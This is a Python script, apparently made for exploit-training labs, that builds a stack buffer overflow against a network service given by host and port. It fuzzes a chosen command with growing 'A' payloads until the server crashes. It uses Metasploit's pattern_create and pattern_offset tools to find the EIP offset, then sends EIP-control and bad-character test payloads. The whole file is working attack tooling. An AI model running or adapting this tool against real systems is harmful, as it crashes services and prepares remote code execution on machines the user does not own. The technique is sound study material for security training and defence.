#!/usr/bin/python3.9

# basic use of this script, find the command to fuzz then let it run till crash
# let it use the metasploit framework tool to make a string for it to crash with again
# after that crash enter the characters within the eip and it will provide the offset

import socket
import subprocess
import argparse
from time import sleep

parser = argparse.ArgumentParser()
parser.add_argument('host', help="Server address")
parser.add_argument('port', type=int, help="Port of server")
args = parser.parse_args()

def connection_init():
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    check = s.connect_ex((args.host, args.port))

    if check:
        print('Issue connection to server: %s' % check)
        connection = False
    else:
        print(s.recv(1024).decode())
        connection = True
    return s,connection

def send_message(s, payload):
    s.send(payload.encode())


def overflow_tools():
    while True:
        tool = input('tools> ')
        if tool == 'fuzzer':
            command = input('Enter the command to fuzz: ')
            offset_fuzzer(command)
        elif tool == 'manual':
            manual_fuzz()
        elif tool == 'shell':
            break
        elif tool == 'check':
            connection_init()
        elif tool == 'test eip':
            test_eip()
        elif tool == 'badchars':
            finding_bad_chars()
    return

def manual_fuzz():
    command = input('Enter command: ')
    chars = input('Enter number of characters to send: ')
    payload = ''.join([command, ' ', 'A' * int(chars)])
    s,connection = connection_init()
    send_message(s, payload)


def offset_fuzzer(command):
    crash = ''
    buffer = ''
    rough_fuzzing = True
    fine_fuzzing = True
    while rough_fuzzing:
        try:
            crash = crash + 'A'*300
            payload = ''.join([command, crash])
            s,connection = connection_init()
            send_message(s, payload)
            print('%d %s' % (len(crash), s.recv(1024).decode()))
            buffer = crash
            sleep(1)
        except:
            print('Crashes between %d and %d bytes' % (len(buffer), len(crash)))
            rough_fuzzing = False
            cont = input('Restart the server then hit enter to continue.')
    
    print('Checking connection')
    s,connection = connection_init()
    test = input('Send test command: ')
    send_message(s, test)
    print(s.recv(1024).decode())

    script = '/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb'
    arg1 = '-l'
    arg2 = str(len(crash))
    offset_pattern = subprocess.run([script, arg1, arg2], capture_output=True)
    print(offset_pattern.stdout.decode())
    payload = ''.join([command, offset_pattern.stdout.decode()])
    send_message(s, payload)

    script = '/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb'
    arg3 = '-q'
    eip_chars = input('Enter the characters in the EIP after the crash: ')
    offset_find = subprocess.run([script, arg1, arg2, arg3, eip_chars], capture_output=True)
    print(offset_find.stdout.decode())

def test_eip(badchars=''):
    command = input('Enter the vulnerable command: ')
    offset = int(input('What was the determined offset? '))
    eip_len = int(input('What is the eip length? '))
    payload = ''.join([command, 'A' * offset, 'B' * eip_len, badchars])
    s,connection = connection_init()
    send_message(s, payload)
    print('Check eip for 42s, should be full if the offset was correct.')

def finding_bad_chars():
    badchars = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
    )
    test_eip(badchars)
    print('Look at the ESP dump for characters replaced by B0.')


if __name__ == '__main__':

    s,connection = connection_init()

    while connection:
        message = input('-> ')
        print(message)
        if message == 'tools':
            overflow_tools()
            connection_init()
        else:
            send_message(s, message)
            print(s.recv(1024).decode())
    
    s.close()


